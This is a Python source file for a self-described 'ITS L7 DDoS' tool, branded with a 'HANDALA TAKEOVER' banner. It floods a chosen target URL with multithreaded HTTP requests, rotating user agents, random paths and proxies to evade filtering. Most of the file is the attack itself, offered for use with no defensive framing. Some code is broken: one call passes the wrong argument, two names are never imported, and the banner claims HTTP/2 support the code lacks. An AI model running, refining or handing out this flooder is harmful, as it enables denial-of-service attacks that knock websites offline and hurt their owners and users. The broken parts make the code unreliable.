#!/usr/bin/env python
"""
ITS L7 DDoS Tool - Advanced Layer 7 Attack Tool
WHOAMISec Offensive Security Toolkit
"""

import sys
import argparse
import threading
import time
import random
import string
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.disable_warnings)

class ITSL7DDoS:
    def __init__(self, target, duration, rps, threads, proxy_file=None):
        self.target = target
        self.duration = duration
        self.rps = rps
        self.threads = threads
        self.proxy_file = proxy_file
        self.proxies = []
        self.stop_flag = False
        self.success_count = 0
        self.fail_count = 0
        
        # Parse target URL
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path or '/'
        
        # Load proxies if provided
        if proxy_file:
            self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.proxies)} proxies")
        except FileNotFoundError:
            print(f"[!] Proxy file not found: {self.proxy_file}")
            sys.exit(1)
    
    def generate_user_agent(self):
        """Generate random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
        ]
        return random.choice(user_agents)
    
    def generate_random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def generate_random_path(self):
        """Generate random path for requests"""
        paths = [
            f'/{self.generate_random_string()}',
            f'/{self.generate_random_string()}.php',
            f'/{self.generate_random_string()}.html',
            f'/{self.generate_random_string()}.jpg',
            f'/{self.generate_random_string()}.css',
            f'/{self.generate_random_string()}.js',
            f'/admin/{self.generate_random_string()}',
            f'/api/{self.generate_random_string()}',
            f'/wp-content/{self.generate_random_string()}',
            f'/images/{self.generate_random_string()}.jpg'
        ]
        return random.choice(paths)
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if self.proxies:
            return random.choice(self.proxies)
        return None
    
    def send_http_request(self):
        """Send HTTP request to target"""
        try:
            headers = {
                'User-Agent': self.generate_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            }
            
            # Random path
            path = self.generate_random_path()
            url = urljoin(self.target, path)
            
            # Proxy setup
            proxies = {}
            random_proxy = self.get_random_proxy()
            if random_proxy:
                if '://' in random_proxy:
                    proxies = {
                        'http': random_proxy,
                        'https': random_proxy
                    }
                else:
                    proxies = {
                        'http': f'http://{random_proxy}',
                        'https': f'http://{random_proxy}'
                    }
            
            # Send request
            response = requests.get(
                url,
                headers=headers,
                proxies=proxies if proxies else None,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            
            if response.status_code in [200, 301, 302, 403, 404]:
                self.success_count += 1
                return True
            else:
                self.fail_count += 1
                return False
                
        except requests.exceptions.RequestException:
            self.fail_count += 1
            return False
    
    def attack_thread(self):
        """Attack thread function"""
        while not self.stop_flag:
            try:
                self.send_http_request()
                time.sleep(1 / self.rps)  # Rate limiting
            except:
                pass
    
    def start_attack(self):
        """Start the DDoS attack"""
        print(f"""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ✋✋✋ ITS L7 DDoS ATTACK TOOL - HANDALA TAKEOVER ✋✋✋                                   ║
║  █     █░▓█████  ██▀███   ███▄ ▄███▓▓█████  ██▓███   ▄▄▄█████▓░██████╗ ██╗          ║
║  ▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒▒██    ▒ ▒██║          ║
║  ▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒███   ▓██░ ██▓▒▒ ▓██░ ▒░░ ▓██▄   ░██║          ║
║  ░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░   ▒   ██▒░██║          ║
║  ░░██▒██▓ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒██████▒▒░██║          ║
║  ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░▓  ║
║    ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ░ ░  ░░▒ ░         ░    ░  ░▒  ░ ░ ▒ ░║
║    ░   ░     ░     ░░   ░ ░      ░      ░   ░░         ░ ░    ░  ░  ░   ▒ ░║
║      ░       ░  ░   ░            ░      ░  ░                       ░   ░   ║
║                                                                           ║
║        {Fore.YELLOW}ITS L7 DDoS TOOL - ADVANCED LAYER 7 ATTACK SYSTEM{Fore.RED}                 ║
║   {Fore.GREEN}HTTP/2 Support | Proxy Rotation | Advanced Evasion{Fore.RED}                ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
        """)
        
        print(f"[+] Target: {self.target}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] RPS: {self.rps}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Proxies: {len(self.proxies) if self.proxies else 'None'}")
        print(f"[+] Attack started at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
        
        # Start threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor attack
        start_time = time.time()
        while time.time() - start_time < self.duration:
            elapsed = time.time() - start_time
            print(f"\r[+] Elapsed: {int(elapsed)}s | Success: {self.success_count} | Failed: {self.fail_count}", end='')
            time.sleep(1)
        
        # Stop attack
        self.stop_flag = True
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=5)
        
        print("\n" + "=" * 80)
        print(f"[+] Attack completed!")
        print(f"[+] Total Success: {self.success_count}")
        print(f"[+] Total Failed: {self.fail_count}")
        print(f"[+] Success Rate: {(self.success_count/(self.success_count+self.fail_count)*100):.2f}%")
        
        return {
            "success": True,
            "target": self.target,
            "duration": self.duration,
            "threads": self.threads,
            "success_count": self.success_count,
            "fail_count": self.fail_count,
            "success_rate": (self.success_count/(self.success_count+self.fail_count)*100)
        }

def main():
    parser = argparse.ArgumentParser(description='ITS L7 DDoS Attack Tool')
    parser.add_argument('--target', required=True, help='Target URL to attack')
    parser.add_argument('--time', type=int, required=True, help='Attack duration in seconds')
    parser.add_argument('--rps', type=int, required=True, help='Requests per second')
    parser.add_argument('--threads', type=int, required=True, help='Number of threads')
    parser.add_argument('--proxyFile', help='Path to proxy file (optional)')
    parser.add_argument('--output', choices=['json', 'text'], default='json', help='Output format')
    
    args = parser.parse_args()
    
    # Create attack instance
    attack = ITSL7DDoS(
        target=args.target,
        duration=args.time,
        rps=args.rps,
        threads=args.threads,
        proxy_file=args.proxyFile
    )
    
    # Start attack
    try:
        result = attack.start_attack()
        
        if args.output == 'json':
            print(json.dumps({
                "tool": "its-l7-ddos",
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "status": "completed",
                "result": result
            }, indent=2))
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()